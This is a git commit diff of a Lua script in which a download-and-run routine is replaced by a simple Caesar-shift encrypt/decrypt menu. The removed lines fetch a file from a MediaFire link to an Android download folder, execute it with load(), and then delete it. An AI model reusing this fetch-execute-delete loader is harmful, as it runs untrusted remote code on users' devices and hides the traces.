70efe2e1236e3bfb560d72d0b416895af21e9361
HrackGG <contagogle000000g@gmail.com>
2025-02-22 17:31:29 -0300

    Atualizar o ScriptTool.lua

--- ScriptTool.lua
+++ ScriptTool.lua
@@ -1,57 +1,51 @@
--- Função para baixar o arquivo
-function downloadFile(url, savePath)
-    local http = require("socket.http")  -- Usando a biblioteca LuaSocket
-    local ltn12 = require("ltn12")
+-- Função para criptografar
+function encrypt(text, shift)
+    local encrypted = ""
+    for i = 1, #text do
+        local char = text:sub(i, i)
+        local num = string.byte(char)
+        local encryptedNum = num + shift  -- Desloca o valor do byte
+        encrypted = encrypted .. string.char(encryptedNum)  -- Converte de volta para caractere
+    end
+    return encrypted
+end
+
+-- Função para descriptografar
+function decrypt(encryptedText, shift)
+    local decrypted = ""
+    for i = 1, #encryptedText do
+        local char = encryptedText:sub(i, i)
+        local num = string.byte(char)
+        local decryptedNum = num - shift  -- Reverte o deslocamento
+        decrypted = decrypted .. string.char(decryptedNum)  -- Converte de volta para caractere
+    end
+    return decrypted
+end
+
+-- Função principal para selecionar o que fazer
+function main()
+    print("Escolha uma opção: ")
+    print("1. Criptografar")
+    print("2. Descriptografar")
     
-    -- Tenta fazer o download
-    local response, status = http.request{
-        url = url,
-        sink = ltn12.sink.file(io.open(savePath, "wb"))  -- Salva o arquivo na pasta de destino
-    }
+    local choice = io.read()  -- Lê a escolha do usuário
     
-    if status == 200 then
-        print("Download concluído com sucesso!")
+    print("Digite o texto:")
+    local inputText = io.read()  -- Lê o texto a ser processado
+    
+    print("Digite o valor do deslocamento (shift):")
+    local shift = tonumber(io.read())  -- Lê o valor do deslocamento (convertido para número)
+
+    if choice == "1" then
+        local encryptedText = encrypt(inputText, shift)
+        print("Texto criptografado: " .. encryptedText)
+    elseif choice == "2" then
+        local decryptedText = decrypt(inputText, shift)
+        print("Texto descriptografado: " .. decryptedText)
     else
-        print("Falha no download! Status: " .. status)
+        print("Opção inválida!")
     end
 end
 
--- Função para executar o script baixado
-function executeDownloadedScript(filePath)
-    local file = io.open(filePath, "r")
-    if file then
-        local scriptContent = file:read("*a")  -- Lê o conteúdo do arquivo
-        file:close()
-        
-        -- Executa o conteúdo do script
-        load(scriptContent)()
-        print("Script executado com sucesso!")
-    else
-        print("Erro ao abrir o script!")
-    end
-end
-
--- Função para excluir o script após execução
-function deleteFile(filePath)
-    local success, err = os.remove(filePath)
-    if success then
-        print("Script excluído com sucesso!")
-    else
-        print("Erro ao excluir o script: " .. err)
-    end
-end
-
--- Caminho para salvar o script na pasta de downloads
-local savePath = "/storage/emulated/0/Download/ScriptTeste.lua"  -- Substitua com o caminho correto
-
--- URL do arquivo
-local url = "https://download948.mediafire.com/y8jd4q60d4ugrYfIlA-63F3tXJx3oZLIsAfdZTW_tPO4s1XelGG2hslZRzp6-7tBjfCi-gb_Yo5OdRYbIa5PKx1LCtyBZMHYoHrTGRDMqp4DCNA48oUXhpFrvtBoiRXoF27dWENqP1WT5R4qDI71Fwzgr89pHHFht9lzu31fMlC2wA/umhvmdkvjshi7u1/TUDO+PARA+SCRIPT.zip"
-
--- Baixa o script
-downloadFile(url, savePath)
-
--- Executa o script baixado
-executeDownloadedScript(savePath)
-
--- Exclui o script após a execução
-deleteFile(savePath)
+-- Executa o programa
+main()
